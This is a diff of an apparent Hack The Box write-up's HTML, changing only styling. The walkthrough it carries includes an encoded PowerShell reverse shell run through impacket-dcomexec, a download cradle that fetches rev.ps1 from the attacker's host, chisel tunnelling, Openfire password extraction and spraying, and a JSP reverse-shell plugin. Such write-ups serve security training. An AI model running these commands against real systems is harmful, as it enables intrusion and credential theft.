-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box <span style="color:#e6db74">&#39;powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAxACIALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box <span style="color:#e6db74">&#39;powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAxACIALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;</span>
 </span></span></code></pre></div><p>We get a connection</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-23-181936_.png">
@@ -1168,14 +1168,14 @@
 <ol>
 <li>
 <p>Create the powershell cradle file:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;IEX (New-Object Net.Webclient).downloadstring(&#34;http://10.10.14.31/rev.ps1&#34;)&#39;</span> &gt;&gt; cradle
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;IEX (New-Object Net.Webclient).downloadstring(&#34;http://10.10.14.31/rev.ps1&#34;)&#39;</span> &gt;&gt; cradle
 </span></span></code></pre></div><ul>
 <li>This will be used to grab the hosted shell from our system.</li>
 </ul>
 </li>
 <li>
 <p>Encode the powershell cradle in correct UTF format so powershell can understand it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat cradle | iconv -t UTF-16LE | base64 -w 0; echo
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat cradle | iconv -t UTF-16LE | base64 -w 0; echo
 </span></span></code></pre></div><ul>
 <li>
 <p>Breakdown:</p>
@@ -1202,24 +1202,24 @@
  etc.</p>
 <ul>
 <li>Copy our shell
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>   cp ~/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>   cp ~/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1
 </span></span></code></pre></div></li>
 <li>Modify IP/Port in shell if required.
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>vi rev.ps1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>vi rev.ps1
 </span></span></code></pre></div></li>
 </ul>
 </li>
 <li>
 <p>Start our webserver:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo python -m http.server <span style="color:#ae81ff">80</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo python -m http.server <span style="color:#ae81ff">80</span>
 </span></span></code></pre></div></li>
 <li>
 <p>Start our listener:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rlwrap  -cAr nc -nvlp <span style="color:#ae81ff">53</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rlwrap  -cAr nc -nvlp <span style="color:#ae81ff">53</span>
 </span></span></code></pre></div></li>
 <li>
 <p>Paste the base64 encoded command into powershell/injection point</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>impacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user<span style="color:#960050;background-color:#1e0010">:</span>$pass@$box <span style="color:#e6db74">&#39;powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwAxAC8AcgBlAHYALgBwAHMAMQAiACkACgA=&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>impacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user<span style="color:#960050;background-color:#1e0010">:</span>$pass@$box <span style="color:#e6db74">&#39;powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwAxAC8AcgBlAHYALgBwAHMAMQAiACkACgA=&#39;</span>
 </span></span></code></pre></div></li>
 </ol>
 <p>Shell caught.</p>
@@ -1251,15 +1251,15 @@
 <ol>
 <li>
 <p>Transfer the binary to the target</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wget http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">31</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9000</span>/chisel.exe -o chisel.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wget http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">31</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9000</span>/chisel.exe -o chisel.exe
 </span></span></code></pre></div></li>
 <li>
 <p>Start a listener on kali:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./chisel server -p <span style="color:#ae81ff">8989</span> --reverse
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./chisel server -p <span style="color:#ae81ff">8989</span> --reverse
 </span></span></code></pre></div></li>
 <li>
 <p>Connect back to our listener on kali and redirect traffic from port <code>9090</code> on the target to port <code>8000</code> on our attack machine.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Start-Process -FilePath .\chisel.exe -ArgumentList <span style="color:#e6db74">&#39;client 10.10.14.31:8989 R:8000:127.0.0.1:9090&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Start-Process -FilePath .\chisel.exe -ArgumentList <span style="color:#e6db74">&#39;client 10.10.14.31:8989 R:8000:127.0.0.1:9090&#39;</span>
 </span></span></code></pre></div><ul>
 <li>+Note+: We use the <code>Start-Process</code> cmdlet as it allows us to background the process and continue to use the shell as normal.</li>
 <li><figure><img src="/ox-hugo/2025-04-24-175610_.png">
@@ -1325,7 +1325,7 @@ We can see that we can export the data and it will contain clear text passwords 
 </li>
 </ul>
 <p>If you look at the admin password you can see it contains it contains the part <code>&amp;amp;</code> this is just xml encoding for the symbol <code>&amp;</code>, so we need to remove the other parts until we are left with:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cfg" data-lang="cfg"><span style="display:flex;"><span><span style="color:#a6e22e">odW!!mVfbXs304kskt!QAZDVGY&amp;@</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cfg" data-lang="cfg"><span style="display:flex;"><span><span style="color:#a6e22e">odW!!mVfbXs304kskt!QAZDVGY&amp;@</span>
 </span></span></code></pre></div><p>I check if this is valid, but it does not work.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-24-181740_.png">
@@ -1364,39 +1364,39 @@ We can see that we can export the data and it will contain clear text passwords 
 <ol>
 <li>
 <p>Lets get the required imports:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> xml.etree.ElementTree <span style="color:#66d9ef">as</span> ET
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> xml.etree.ElementTree <span style="color:#66d9ef">as</span> ET
 </span></span></code></pre></div><p>We will use the xml library and call it as <code>ET</code> for ease.</p>
 </li>
 <li>
 <p>Now lets load in our extracted file and parse it using the xml library:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Load and parse the XML</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Load and parse the XML</span>
 </span></span><span style="display:flex;"><span>tree <span style="color:#f92672">=</span> ET<span style="color:#f92672">.</span>parse(<span style="color:#e6db74">&#34;openfiredata.xml&#34;</span>)  <span style="color:#75715e"># Change this to your file path</span>
 </span></span></code></pre></div></li>
 <li>
 <p>We will then use the library to get the root element of the XML tree:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>root <span style="color:#f92672">=</span> tree<span style="color:#f92672">.</span>getroot()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>root <span style="color:#f92672">=</span> tree<span style="color:#f92672">.</span>getroot()
 </span></span></code></pre></div></li>
 <li>
 <p>Let&rsquo;s create two new files for writing the output too, <code>xml_users</code> &amp; <code>xml_passwords</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Open both files for writing</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Open both files for writing</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;xml_users.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> users_file, open(
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;xml_passwords.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>
 </span></span><span style="display:flex;"><span>) <span style="color:#66d9ef">as</span> passwords_file:
 </span></span></code></pre></div></li>
 <li>
 <p>Now we create a simple loop to loop through the file from the xml root object, and search for the string &ldquo;Username&rdquo; &amp; &ldquo;Password&rdquo;. and save them to variables <code>username</code> &amp; <code>password</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> root<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;User&#34;</span>):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> root<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;User&#34;</span>):
 </span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;Username&#34;</span>)<span style="color:#f92672">.</span>text
 </span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;Password&#34;</span>)<span style="color:#f92672">.</span>text
 </span></span></code></pre></div></li>
 <li>
 <p>Finally lets write these returned usernames and passwords to our files and add a new line character <code>\n</code> at the end of each entry so that we don&rsquo;t end up with a single line output.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        users_file<span style="color:#f92672">.</span>write(username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        users_file<span style="color:#f92672">.</span>write(username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 </span></span><span style="display:flex;"><span>        passwords_file<span style="color:#f92672">.</span>write(password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 </span></span></code></pre></div></li>
 </ol>
 <p>The final script should look like this.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> xml.etree.ElementTree <span style="color:#66d9ef">as</span> ET
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> xml.etree.ElementTree <span style="color:#66d9ef">as</span> ET
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Load and parse the XML</span>
 </span></span><span style="display:flex;"><span>tree <span style="color:#f92672">=</span> ET<span style="color:#f92672">.</span>parse(<span style="color:#e6db74">&#34;openfiredata.xml&#34;</span>)  <span style="color:#75715e"># Change this to your file path</span>
@@ -1409,7 +1409,7 @@ We can see that we can export the data and it will contain clear text passwords 
 </span></span><span style="display:flex;"><span>        users_file<span style="color:#f92672">.</span>write(username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 </span></span><span style="display:flex;"><span>        passwords_file<span style="color:#f92672">.</span>write(password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
 </span></span></code></pre></div><p>Lets run it</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 dataextractor<span style="color:#f92672">.</span>py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 dataextractor<span style="color:#f92672">.</span>py
 </span></span></code></pre></div><p>We have our files</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-25-074148_.png">
@@ -1417,7 +1417,7 @@ We can see that we can export the data and it will contain clear text passwords 
 </li>
 </ul>
 <p>Lets verify that the passwords are in fact extracted in the correct order. The easiest way I find to do this is to look at the first and last entries, this way it will tell us if at anypoint it had slipped out of sequence for whatever reason, e.g. a user had no password entry or there was an issue with the script logic.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>head xml_passwords.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>head xml_passwords.txt
 </span></span><span style="display:flex;"><span>head xml_users.txt
 </span></span><span style="display:flex;"><span>head openfiredata.xml
 </span></span><span style="display:flex;"><span>
@@ -1432,11 +1432,11 @@ We can see that we can export the data and it will contain clear text passwords 
 </ul>
 <h4 id="password-spraying-the-recovered-creds">Password Spraying the recovered creds:</h4>
 <p>As these are username and password combos we don&rsquo;t want to bruteforce, e.g. use every single variation with each other, luckily <code>netexec</code> allows to specify the <code>--no-bruteforce</code> flag which will mean it goes through the files at the same in the same order.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u xml_users.txt -p xml_passwords.txt --no-bruteforce --continue-on-success
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u xml_users.txt -p xml_passwords.txt --no-bruteforce --continue-on-success
 </span></span></code></pre></div><p>And…..the only hits we get are for our already recovered users <code>jmontogomery</code> &amp; <code>svc_openfire</code>.</p>
 <h4 id="cred-stuffing-our-3-found-passwords-with-our-new-list-of-users">Cred stuffing our 3 found passwords with our new list of users:</h4>
 <p>As we have a list of recovered passwords, we can cred stuff these with our new list of found users.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u xml_users.txt -p ../Passwords.txt --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u xml_users.txt -p ../Passwords.txt --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>Unfortunately we only get a hit on the records we have already gotten.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-25-095005_.png">
@@ -1451,14 +1451,14 @@ We can see that we can export the data and it will contain clear text passwords 
 </li>
 </ul>
 <p>Looking at the database on the host we can see the <code>passwordKey</code> is available</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cat openfire.script | select-string <span style="color:#e6db74">&#34;passwordKey&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cat openfire.script | select-string <span style="color:#e6db74">&#34;passwordKey&#34;</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-25-103936_.png">
 </figure>
 </li>
 </ul>
 <p>We can then extract the hashed admin password:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cat openfire.script | select-string <span style="color:#e6db74">&#34;admin&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cat openfire.script | select-string <span style="color:#e6db74">&#34;admin&#34;</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-25-104010_.png">
 </figure>
@@ -1474,7 +1474,7 @@ We can see that we can export the data and it will contain clear text passwords 
 <p>So I tried a million different things before trying what I had literally done last week on the solar-lab box as I thought, &ldquo;There is no way privesc will be the same surely&rdquo;, but guess who was wrong.</p>
 <h4 id="creating-a-malicious-reverse-shell-plugin-for-openfire">Creating a malicious reverse shell plugin for OpenFire:</h4>
 <p>After some searching online we can find a public java reverse shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/refs/heads/main/shell.jsp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/refs/heads/main/shell.jsp
 </span></span></code></pre></div><p>All we have to do is modify the Port &amp; IP.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-21-104330_.png">
@@ -1482,14 +1482,14 @@ We can see that we can export the data and it will contain clear text passwords 
 </li>
 </ul>
 <p>Next we download the example plugin repo from OpenFire.</p>
